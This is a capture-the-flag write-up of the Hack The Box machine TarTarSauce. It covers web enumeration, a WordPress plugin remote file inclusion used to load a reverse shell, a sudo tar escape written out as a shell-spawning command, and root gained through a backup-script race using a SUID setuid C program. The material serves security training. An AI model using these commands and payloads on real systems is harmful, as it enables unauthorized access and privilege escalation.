---
title:     "Hack The Box - TarTarSauce"
tags: [linux,medium,wordpress,plugin,custom,32bit]
categories: HackTheBox OSCP-Like

---

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-tartarsauce/Untitled.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-tartarsauce/Untitled.png)

Getting Initial is by finding a vulnerable wordpress plugin and Privilege Escalation is exploiting a Custom script. Its really a fun box.

Link: https://www.hackthebox.eu/home/machines/profile/138

Let's Begin with our Initial Nmap Scan.

## Nmap Scan Results

```bash
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 5 disallowed entries 
| /webservices/tar/tar/source/ 
| /webservices/monstra-3.0.4/ /webservices/easy-file-uploader/ 
|_/webservices/developmental/ /webservices/phpmyadmin/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Landing Page
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.16 (95%), Linux 3.18 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.1 (93%), Linux 3.2 (93%), Linux 3.10 - 4.11 (93%), Oracle VM Server 3.4.2 (Linux 4.1) (93%), Linux 3.12 (93%), Linux 3.13 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   248.39 ms 10.10.14.1
2   248.52 ms 10.10.10.88
```

## HTTP Enumeration

Only HTTP port is open so I checked that and it contains a Welcome message. Let's Dig in.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-tartarsauce/Untitled%201.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-tartarsauce/Untitled%201.png)

## Enumerating Monstra (Rabbit Hole)

From Nmap Scan it reveals there is `robots.txt`

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-tartarsauce/Untitled%202.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-tartarsauce/Untitled%202.png)

First I checked `/monstra-3.0.4`, other than this all seems 404.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-tartarsauce/Untitled%203.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-tartarsauce/Untitled%203.png)

We know the version of it, so I just looked for any exploits available and came to know that we can get user credentials without authenticating.

> [https://simpleinfosec.com/2018/05/27/monstra-cms-3-0-4-unauthenticated-user-credential-exposure/](https://simpleinfosec.com/2018/05/27/monstra-cms-3-0-4-unauthenticated-user-credential-exposure/)

Here we can see a users password and hash, but they are encrypted.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-tartarsauce/Untitled%204.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-tartarsauce/Untitled%204.png)

But when I loaded back to home page. I became admin. That seems odd.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-tartarsauce/Untitled%205.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-tartarsauce/Untitled%205.png)

While looking for exploits, I also found this one. Where we can upload a file and get Remote Code Execution.

> [https://www.exploit-db.com/exploits/43348](https://www.exploit-db.com/exploits/43348)

According to the exploit, We can bypass the extension filter by uploading our payload in capital letters. So I tried that and it didn't worked.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-tartarsauce/Untitled%206.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-tartarsauce/Untitled%206.png)

After spending some time, I decided to bruteforce the directories.

I found a different directory now.

```bash
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.88/webservices/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt
[+] Timeout:        10s
===============================================================
2020/07/13 12:25:12 Starting gobuster
===============================================================
/wp (Status: 301)
===============================================================
2020/07/13 12:31:33 Finished
===============================================================
```

## Getting User Shell

So its confirmed that's a wordpress site.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-tartarsauce/Untitled%207.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-tartarsauce/Untitled%207.png)

First I did Vulnerable Plugin but it didn't revealed anything. So I just did a full plugin scan.

```bash
root@kali:~/CTF/HTB/Boxes/Tartarsauce# wpscan --url http://10.10.10.88:80/webservices/wp -e ap --plugins-detection aggressive 
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.2
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.10.88/webservices/wp/ [10.10.10.88]
[+] Started: Mon Jul 13 18:32:31 2020
.
.
.
.
.
.
[+] gwolle-gb
 | Location: http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/
 | Last Updated: 2020-06-21T14:59:00.000Z
 | Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt
 | [!] The version is out of date, the latest version is 4.0.4
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/, status: 200
 |
 | Version: 2.3.10 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt
```

Now it reveals a new plugin for me.

Immediately searched in searchsploit and there is RFI exploit available.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-tartarsauce/Untitled%208.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-tartarsauce/Untitled%208.png)

According to the exploit, it looks for file name `wp-load.php`, So I changed my php reverse shell name as `wp-load`

And in my python server, I got the hit.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-tartarsauce/Untitled%209.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-tartarsauce/Untitled%209.png)

And Reverse shell in my nc listener.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-tartarsauce/Untitled%2010.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-tartarsauce/Untitled%2010.png)

The first thing I do always is, Checking `sudo -l` and it seems I can run `tar` as user onuma without any password.

```bash
$ sudo -l
Matching Defaults entries for www-data on TartarSauce:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on TartarSauce:
    (onuma) NOPASSWD: /bin/tar
```

> [https://gtfobins.github.io/gtfobins/tar/#sudo](https://gtfobins.github.io/gtfobins/tar/#sudo)

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-tartarsauce/Untitled%2011.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-tartarsauce/Untitled%2011.png)

tar have some special parameters than can help us to spawn a shell as user `onuma`

```bash
$ sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
$ whoami
whoami
onuma
```

## Privilege Escalation

First I uploaded Enum script and it doesn't reveals anything, So I tried uploading `pspy` and after sometime I get a hit with this running as user root.

```bash
2020/07/13 05:00:41 CMD: UID=0    PID=26257  | /bin/bash /usr/sbin/backuperer
```

So I checked the script and its a bash script doing some backup stuffs.

```bash
#!/bin/bash

#-------------------------------------------------------------------------------------
# backuperer ver 1.0.2 - by ȜӎŗgͷͼȜ
# ONUMA Dev auto backup program
# This tool will keep our webapp backed up incase another skiddie defaces us again.
# We will be able to quickly restore from a backup in seconds ;P
#-------------------------------------------------------------------------------------

# Set Vars Here
basedir=/var/www/html
bkpdir=/var/backups
tmpdir=/var/tmp
testmsg=$bkpdir/onuma_backup_test.txt
errormsg=$bkpdir/onuma_backup_error.txt
tmpfile=$tmpdir/.$(/usr/bin/head -c100 /dev/urandom |sha1sum|cut -d' ' -f1)
check=$tmpdir/check

# formatting
printbdr()
{
    for n in $(seq 72);
    do /usr/bin/printf $"-";
    done
}
bdr=$(printbdr)

# Added a test file to let us see when the last backup was run
/usr/bin/printf $"$bdr\nAuto backup backuperer backup last ran at : $(/bin/date)\n$bdr\n" > $testmsg

# Cleanup from last time.
/bin/rm -rf $tmpdir/.* $check

# Backup onuma website dev files.
/usr/bin/sudo -u onuma /bin/tar -zcvf $tmpfile $basedir &

# Added delay to wait for backup to complete if large files get added.
/bin/sleep 30

# Test the backup integrity
integrity_chk()
{
    /usr/bin/diff -r $basedir $check$basedir
}

/bin/mkdir $check
/bin/tar -zxvf $tmpfile -C $check
if [[ $(integrity_chk) ]]
then
    # Report errors so the dev can investigate the issue.
    /usr/bin/printf $"$bdr\nIntegrity Check Error in backup last ran :  $(/bin/date)\n$bdr\n$tmpfile\n" >> $errormsg
    integrity_chk >> $errormsg
    exit 2
else
    # Clean up and save archive to the bkpdir.
    /bin/mv $tmpfile $bkpdir/onuma-www-dev.bak
    /bin/rm -rf $check .*
    exit 0
fi
```

```bash
# Set Vars Here
basedir=/var/www/html
bkpdir=/var/backups
tmpdir=/var/tmp
testmsg=/var/backups/onuma_backup_test.txt
errormsg=/var/backups/onuma_backup_error.txt
tmpfile=/var/tmp/.$(/usr/bin/head -c100 /dev/urandom |sha1sum|cut -d' ' -f1)
check=/var/tmp/check
```

- First it recursively deletes everything in /var/tmp/.* and /var/tmp/check.
- Then it gzip everything in the directory */var/www/html* and saves it in the file /var/tmp/.afgaufiuafgwfaf
- After it sleeps for 30 seconds.
- Creates the directory /var/tmp/check.
- Extract the gzip file inside the check folder.
- Then it do a integrity check.
- If the files in /var/www/html are different from the files in the backup it created /var/tmp/check/var/www/html, then report error. Otherwise, move file /var/tmp/.efgefffsafffav to /var/backups/onuma-wwww-dev.bak and remove everything in the check directory. If the files are different it left that there and after 5mins when the application reruns remove those directory and start the process again.

So What we need to do is, We need to change the .ffegsigiisifghis file with our payload within the 30 seconds and after 30seconds it will extract it and Integrity checks happen, so it will different and it left those file there for the next 5mins. 

Since the machine is 32bit, I made a C program and compiled it with 32bit. And make it SUID.

```bash
#include <unistd.h>
int main()
{
    setuid(0);
    execl("/bin/bash", "bash", (char *)NULL);
    return 0;
}
```

Created  `var/www/html` folder and put my file inside.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-tartarsauce/Untitled%2012.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-tartarsauce/Untitled%2012.png)

Opened Pspy in one terminal and waiting for the first hit. And here it takes the backup and stored it in `/var/tmp`

```bash
2020/07/13 23:46:43 CMD: UID=1000 PID=2738   | /bin/tar -zcvf /var/tmp/.f7b56259dddf91387805c988a567e7b2c594024d /var/www/html 
2020/07/13 23:46:43 CMD: UID=1000 PID=2737   | /bin/tar -zcvf /var/tmp/.f7b56259dddf91387805c988a567e7b2c594024d /var/www/html
```

I just Copy my payload (pwn) and replace it with the one it created.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-tartarsauce/Untitled%2013.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-tartarsauce/Untitled%2013.png)

Here we can see after the 30seconds it just extracted the file.

```bash
2020/07/13 23:47:13 CMD: UID=0    PID=2749   | /bin/tar -zxvf /var/tmp/.f7b56259dddf91387805c988a567e7b2c594024d -C /var/tmp/check 
2020/07/13 23:47:13 CMD: UID=0    PID=2748   | /bin/tar -zxvf /var/tmp/.f7b56259dddf91387805c988a567e7b2c594024d -C /var/tmp/check
```

Now we can see that `check` directory is created.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-tartarsauce/Untitled%2014.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-tartarsauce/Untitled%2014.png)

And running that SUID binary make me root. We own the Box!